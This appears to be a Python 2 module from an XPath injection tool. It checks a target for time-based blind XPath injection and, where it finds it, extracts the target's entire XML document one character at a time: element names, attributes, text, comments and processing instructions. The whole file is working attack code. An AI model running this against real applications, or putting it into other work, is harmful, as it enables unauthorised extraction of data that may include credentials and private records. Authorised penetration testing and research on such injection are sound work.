import socket, time
#-------------------------------------------------------------------------------
from XPath_functions    import count                                            #1
from XPath_functions    import string_length                                    #2
from XPath_functions    import substring                                        #3
from XPath_functions    import doc                                              #4
from XPath_functions    import unparsed_text                                    #5
from XPath_functions    import reverse                                          #6
from XPath_functions    import concat2                                          #7
from XPath_functions    import concat3                                          #8
from XPath_functions    import using_doc                                        #9
from XPath_functions    import encode_for_uri                                   #10
from XPath_functions    import simple_count                                     #11
from XPath_functions    import if_then                                          #12
from XPath_functions    import string                                           #13
from XPath_functions    import xxe_doc                                          #14
from XPath_functions    import url                                              #15
from XPath_functions    import more_then                                        #16
#-------------------------------------------------------------------------------
from XPath_elements     import name                                             #1
from XPath_elements     import nodes                                            #2
from XPath_elements     import node                                             #3
from XPath_elements     import text                                             #4
from XPath_elements     import arguments                                        #5
from XPath_elements     import argument                                         #6
from XPath_elements     import comments                                         #7
from XPath_elements     import comment                                          #8
from XPath_elements     import namespace_uri                                    #9
from XPath_elements     import processing_instructions                          #10
from XPath_elements     import processing_instruction                           #11
from XPath_elements     import NODE                                             #12
from XPath_elements     import ARG                                              #13
from XPath_elements     import COMM                                             #14
from XPath_elements     import PRIN                                             #15
#-------------------------------------------------------------------------------
from checker            import bb_checker
from checker            import tb_checker
#-------------------------------------------------------------------------------
from templates          import base_templates, template, choose_tag
#-------------------------------------------------------------------------------
DEBUG = False
################################################################################


################################################################################
string_of_chars = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ _@/[]}{():^$#*-+=%,.<>"
################################################################################


################################################################################
def tb_test(t, _netcon, _t, _doc):                                              #tb_test
    try:
        for i in _t:
            j = 1000                                                            #init j
            while j < 1000000000:
                s = template(i,if_then(count(nodes(_doc),1),reverse(j)))
                if tb_checker(_netcon,choose_tag(i,s),t):
                    if DEBUG:
                        print '[\033[95mFIND\033[92m]',s
                    print '[\033[94mINFO\033[92m]: time-based available :',t,i[0],i[1]
                    return True, i, j*5
                j = j*5                                                         #j*10
        print '[\033[94mINFO\033[92m]: time-based vulnerability not found :',t
        return False, None, 0
    except:
        pass
################################################################################


################################################################################
def count_elem(     time,              _netcon,    t,   _xpath, iterator):      #count_elem
    s = template(t,if_then(count(_xpath,0),reverse(iterator)))
    if tb_checker(_netcon,choose_tag(t,s),time):
        return
    result = 1
    s = template(t,if_then(count(_xpath,result),reverse(iterator)))
    while not tb_checker(_netcon,choose_tag(t,s),time):
        result = result + 1
        s = template(t,if_then(count(_xpath,result),reverse(iterator)))
    return result
#-------------------------------------------------------------------------------
def step(           time,              _netcon,    t,   _xpath, iterator):      #step
    s = template(t,if_then(string_length(_xpath,0),reverse(iterator)))
    if tb_checker(_netcon,choose_tag(t,s),time):
        return
    length = 1
    s = template(t,if_then(string_length(_xpath,length),reverse(iterator)))
    while not tb_checker(_netcon,choose_tag(t,s),time):
        length = length + 1
        s = template(t,if_then(string_length(_xpath,length),reverse(iterator)))
    result = ""
    for _i in range(1,length+1):
        f = True
        for _j in string_of_chars:
            s = template(t,if_then(substring(_xpath,_i,_j),reverse(iterator)))
            if tb_checker(_netcon,choose_tag(t,s),time):
                result = result + _j;
                f = False
                break
        if f:
            result = result + '\033[34m?\033[0m';
    return result
#-------------------------------------------------------------------------------
def argument_cycle(     time,              _netcon,    t,   _xpath, iterator):  #argument_cycle
    A = ARG()
    amount = count_elem(time,_netcon,t,A.S(_xpath), iterator)
    if amount != None:
        s = ""
        for i in range(1, amount+1):
            result = step(  time,  _netcon,    t, name(A.E(_xpath,i)), iterator)
            if result != None:
                s = s+' '+result+'='
            result = step(  time,  _netcon,    t, A.E(_xpath,i), iterator)
            if result != None:
                s = s+'"'+result+'"'
        return s
    return
#-------------------------------------------------------------------------------
def comment_cycle(      time,  _netcon,    t,   _xpath,    tab, iterator):      #comment_cycle
    C = COMM()
    amount = count_elem(time,_netcon,t,C.S(_xpath), iterator)
    if amount != None:
        for i in range(1, amount+1):
            s = ""
            result = step(  time,  _netcon,    t, C.E(_xpath,i), iterator)
            if result != None:
                s = s+'\n'+tab+'<!--'+result+'-->'
            print s
    return
#-------------------------------------------------------------------------------
def proc_cycle(         time,      _netcon,    t,   _xpath,    tab, iterator):  #proc_cycle
    P = PRIN()
    amount = count_elem(time,_netcon,t,P.S(_xpath), iterator)
    if amount != None:
        for i in range(1, amount+1):
            s = ""
            result = step(  time,  _netcon,    t, name(P.E(_xpath,i)), iterator)
            if result != None:
                s = s+'\n'+tab+'<?'+result+' '
            result = step(  time,  _netcon,    t, P.E(_xpath,i), iterator)
            if result != None:
                s = s+result+'?>'
            print s
    return
#-------------------------------------------------------------------------------
def recursive_descent(  time,      _netcon,    t,  _xpath, _deep, iterator):    #recursive_descent
    N = NODE()
    amount = count_elem(time,_netcon,t,N.S(_xpath), iterator)
    if amount != None:
        tab = _deep*"\t"
        for i in range(1, amount+1):
            s = tab+"<"
            find_node = tab+"</"
            result = step(time,   _netcon,    t,  name(N.E(_xpath,i)), iterator)
            if result != None:
                find_node = find_node+result
                s = s+result
            #Most databases doesn't support
            #result = step(time,_netcon,t,namespace_uri(N.E(_xpath,i)),iterator)
            #if result != None:
            #    s = s+' xmlns="'+result+'"'
            result = argument_cycle( time, _netcon, t,  N.E(_xpath,i), iterator)
            if result != None:
                s = s+result
            s = s+">"
            print s
            result = step(time,   _netcon,    t,  text(N.E(_xpath,i)), iterator)
            if result != None:
                print result
                print find_node+">"
                continue
            result = comment_cycle(  time, _netcon,    t,  N.E(_xpath,i),\
                                     tab+'\t', iterator)
            result = proc_cycle(     time, _netcon,    t,  N.E(_xpath,i),\
                                     tab+'\t', iterator)
            recursive_descent(  time,      _netcon,    t,  N.E(_xpath,i),\
                                _deep+1, iterator)
            print find_node+">"
    return
################################################################################


################################################################################
def test(_settings, _netcon, _doc):                                             #test
    try:
        if _settings.available('template'):
            _t = [_settings.get('template')]
            if '"' in _t[0][1]:
                _t[0].append('"')
            else:
                _t[0].append('\'')
        else:
            _t = base_templates
        if _settings.available('t'):
            print '[\033[94mINFO\033[92m]: time-based checking ...'
            XPIsettings = tb_test(_settings.get('t'),_netcon,_t,_doc)
            if DEBUG:
                print XPIsettings
        return
    except Exception,e:
        print ("[\033[91mERROR\033[92m]: Unexpected termination"
               +" of the program from time_tester")
        print "Reason:",e
        exit()
#-------------------------------------------------------------------------------
def scan(_settings, _netcon, _doc):
    try:
        if _settings.available('template'):
            _t = [_settings.get('template')]
            if '"' in _t[0][1]:
                _t[0].append('"')
            else:
                _t[0].append('\'')
        else:
            _t = base_templates
        if _settings.available('t'):
            print '[\033[94mINFO\033[92m]: time-based checking ...'
            XPIsettings = tb_test(_settings.get('t'),_netcon,_t,_doc)
            if XPIsettings[0]:
                recursive_descent(_settings.get('t'),_netcon,XPIsettings[1],\
                                  _doc,0,XPIsettings[2])
            if DEBUG:
                print XPIsettings
    except Exception,e:
        print ("[\033[91mERROR\033[92m]: Unexpected termination"
               +" of the program from time_tester")
        print "Reason:",e
        exit()
